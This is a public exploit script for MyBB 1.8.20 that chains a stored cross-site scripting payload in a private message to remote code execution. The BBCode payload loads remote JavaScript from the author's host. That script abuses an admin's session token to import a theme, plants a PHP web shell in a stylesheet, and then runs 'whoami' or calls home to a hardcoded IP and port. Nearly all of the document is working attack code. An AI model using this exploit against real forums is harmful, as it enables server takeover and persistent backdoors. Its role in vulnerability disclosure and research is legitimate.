/*
# Exploit Title: MyBB < 1.8.21 Authenticated RCE 
# Date: July 24, 2019
# Exploit Author: Giovanni Chhatta (https://www.linkedin.com/in/giovannichhatta/)
# Vendor Homepage: https://mybb.com/
# Software Link: https://resources.mybb.com/downloads/mybb_1820.zip
# Version: 1.8.20
# Tested on: Windows 10
# Blog: https://blog.ripstech.com/2019/mybb-stored-xss-to-rce/

Payload: [video=youtube]http://test/test#[url]onload='script=document.createElement(%22script%22);script.src=%22https://giovan.nl/mybb.js%22;document.body.append(script);'//[/url][/video]
This payload fetches another JS file (mybb.js), hosted on a VPS.

NOTE: Mybb's textbox will dynamically change apostrophes (') to &#39; . To fix this just manually change them back to apostrophes and hit 'send'. 
The payload will trigger once an admin views the message.
*/

/*
 * mybb.js
 */

function postReq(toUrl,body,setHeaders = true){
	var xhr = new XMLHttpRequest();
	xhr.open("POST",toUrl,false);

	if(setHeaders){
		xhr.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:66.0) Gecko/20100101 Firefox/66.0");
		xhr.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		xhr.setRequestHeader("Accept-Language","nl,en-US;q=0.7,en;q=0.3");
		xhr.setRequestHeader("Content-Type","multipart/form-data; boundary=---------------------------21840354016818");
		xhr.setRequestHeader("Upgrade-Insecure-Requests","1");
	}else{
		xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	}	
	xhr.send(body);
}

function getReq(toUrl, property = true){
	var xhr = new XMLHttpRequest();

	xhr.open("GET",toUrl,false);
	xhr.send();

	prop = property ? xhr.responseText : xhr.status;
	return prop; 
}

function upload(url,key,payload){
	url = url + "admin/index.php?module=style-themes&action=import";
	data = "-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"my_post_key\"\r\n\r\n"+key+"\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"import\"\r\n\r\n0\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"local_file\"; filename=\"shel1l.xml\"\r\nContent-Type: text/xml\r\n\r\n"+payload+"\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"url\"\r\n\r\n\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"tid\"\r\n\r\n1\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"version_compat\"\r\n\r\n1\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"import_stylesheets\"\r\n\r\n1\r\n-----------------------------21840354016818\r\nContent-Disposition: form-data; name=\"import_templates\"\r\n\r\n1\r\n-----------------------------21840354016818--\r\n";
	postReq(url,data);
}

function fakeDiv(body){
	var div = document.createElement('div');
	div.innerHTML = body;
	div.setAttribute("id","fakediv");
	
	document.body.append(div);
	var themeLink = document.getElementsByClassName("popup_item")[2].href;
	var themeID = themeLink.substring(themeLink.indexOf("tid")+4,themeLink.length);
	document.getElementById("fakediv").remove();
	return themeID;
}

function getThemeID(url){
	url = url + "admin/index.php?module=style-themes";
	responseBody = getReq(url); 
	return fakeDiv(responseBody);
}

function editStylesheet(url,key,tid,filename){
	url = url + "admin/index.php?module=style-themes&action=edit_stylesheet&mode=advanced";
	data = "my_post_key="+key+"&tid="+tid+"&file="+filename+"&stylesheet=%3C%3Fphp+system%28%24_GET%5B1%5D%29%3B+%3F%3E&save=Save+Changes";

	postReq(url,data,false);

}

function checkShell(url,theme,filename){
	url = url + "cache/themes/theme" + theme + "/" + filename;
	if(getReq(url,false) == 200){
		console.log("[*] Shell found in theme " + theme);
		window.open(host + "cache/themes/theme"+theme+"/"+filename+"?1=whoami");
	}else{
		console.log("[!] Exploit failed: Couldn't find shell.")
	}
}

function callHome(theme){
	let IP = "10.11.6.96";
	let port = 1234;

	let url = "http://" + IP + ":" + port + "/" + document.domain + "/isPwned/theme" + theme;

	getReq(url);
}

isAdmin = false;

host = location.href.substring(0,location.href.indexOf("private.php"));
key = document.getElementsByName("my_post_key")[0].value;
filename = "910910910910910910910910xD.php";
payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<theme>\r\n<stylesheets>\r\n<stylesheet name=\""+filename+".css\">\r\ngecko\r\n</stylesheet>\r\n</stylesheets>\r\n</theme>"
upload(host,key,payload);
theme = getThemeID(host);
editStylesheet(host,key,theme,filename);

isAdmin ? checkShell(host,theme,filename) : callHome(theme);

